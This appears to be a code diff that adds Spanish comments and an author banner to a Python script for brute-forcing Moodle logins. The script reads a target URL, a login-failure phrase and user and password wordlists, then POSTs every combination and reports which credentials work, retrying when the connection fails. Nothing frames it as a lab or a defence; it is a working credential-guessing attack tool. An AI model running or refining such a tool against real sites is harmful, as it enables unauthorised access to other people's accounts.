@@ -1,15 +1,22 @@
-#import mechanize --> otra opció de realizar la sesión con el servidor
+                                #####################################################
+                                #                Script By f3l3p1n0                 #
+                                #####################################################
+
 import sys
 import time
 import requests
 import urllib3
 
-urllib3.disable_warnings()
+urllib3.disable_warnings()  # Desactiva el mensaje de conexión insegura
+
+#  PREGUNTAMOS LA URL, FRASE DE ERROR I DICCIONARIOS
 
 url = input("Introduce la url del moodle a escanear: ")
 frase_error = input("Introduce la frase de error de inicio incorrecto: ")
 ruta_dic_users = input("Ruta ubicación diccionario users: ")
 ruta_dic_passw = input("Ruta ubicación diccionario passwords: ")
+
+#  MENSAJE DEL CREADOR
 
 nombre = ("\x1b[1;33m" + "f" + "\x1b[1;35m" + "3" + "\x1b[1;32m" + "l" + "\x1b[1;34m" + "3" + "\x1b[1;30m" + "p"
           + "\x1b[1;36m" + "1" + "\x1b[1;31m"+ "n" + "\x1b[1;37m" + "0" + "\n")
@@ -24,6 +31,8 @@ for c in z:
     sys.stdout.flush()
     time.sleep(0.02)
 
+#  MENSAJE DE ERROR EN CASO DE QUE LA CONEXIÓN NO SE PUEDA ESTABLECER
+
 def error():
     z = "[o] Hay un problema. Re-intentando la conexión... :(\n"
 
@@ -31,6 +40,8 @@ def error():
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(0.02)
+
+#  CONNECTAMOS CON EL SERVIDOR MEDIANTE UNA PETICIÓN POST
 
 def connect(line1, line2):
     credentials = {
@@ -42,6 +53,8 @@ def connect(line1, line2):
 
     return req
 
+#  CONTROLAMOS QUE EL PROGRAMA NO DEJE DE FUNCIONAR MEDIANTE "TRY" Y "EXCEPT"
+
 def browser(line1, line2):
     time.sleep(0.5)
     while True:
@@ -52,6 +65,8 @@ def browser(line1, line2):
             error()
 
     return ejemplo
+
+#  COMIENZO DEL SCRIPT, ABRIMOS AMBOS DICCIONARIOS Y SE HACE BÚSQUEDA LINEA POR LINEA CADA USUARIO I CLAVE
 
 def main():
     bucle = True
@@ -71,6 +86,7 @@ def main():
                         print("\x1b[0;31m" + "[x] Buscando credenciales... {} - {} Inválidos".format(line1[:-1],line2[:-1]))
                 file2.seek(0)
             file.seek(0)
+
 
 if __name__ == "__main__":
     main()
